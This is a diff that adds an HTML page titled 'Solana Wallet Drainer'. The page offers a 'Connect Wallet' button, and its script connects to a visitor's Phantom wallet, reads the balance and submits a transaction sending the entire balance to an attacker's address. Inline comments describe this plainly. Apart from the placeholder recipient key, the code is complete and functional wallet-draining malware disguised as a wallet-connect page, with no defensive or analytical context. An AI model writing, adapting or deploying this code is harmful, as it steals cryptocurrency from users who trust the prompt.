@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solana Wallet Drainer</title>
+</head>
+<body>
+    <h1>Connect to Your Solana Wallet</h1>
+    <button id="connectButton">Connect Wallet</button>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script>
+        // Wait for the DOM to fully load
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get the button
+            const connectButton = document.getElementById('connectButton');
+
+            // Initialize the Solana web3 library
+            const solanaWeb3 = window.solanaWeb3;
+
+            // Connect to the Solana wallet and drain funds
+            connectButton.addEventListener('click', async () => {
+                if ('solana' in window) {
+                    const provider = window.solana;
+                    if (provider.isPhantom) {
+                        try {
+                            const response = await provider.connect();
+                            console.log('Connected with Public Key:', response.publicKey.toString());
+
+                            // Create a connection to the Solana Mainnet
+                            const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
+
+                            // Define the recipient's public key (attacker's wallet)
+                            const recipientPublicKey = new solanaWeb3.PublicKey('RECIPIENT_PUBLIC_KEY_HERE'); // Replace with the attacker's public key
+
+                            // Get the user's balance
+                            const balance = await connection.getBalance(response.publicKey);
+                            console.log('User balance:', balance);
+
+                            // Create a transaction to transfer all funds to the attacker's wallet
+                            const transaction = new solanaWeb3.Transaction().add(
+                                solanaWeb3.SystemProgram.transfer({
+                                    fromPubkey: response.publicKey,
+                                    toPubkey: recipientPublicKey,
+                                    lamports: balance, // Transfer all available funds
+                                })
+                            );
+
+                            // Sign and send the transaction
+                            const signature = await provider.signAndSendTransaction(transaction);
+                            console.log('Transaction signature:', signature);
+                            alert('Transaction successful! Your funds have been transferred.');
+                        } catch (err) {
+                            console.error('Error connecting to wallet or transferring funds:', err);
+                            alert('Transaction failed!');
+                        }
+                    } else {
+                        alert('Solana wallet (Phantom) not found!');
+                    }
+                } else {
+                    alert('Solana wallet (Phantom) not found!');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
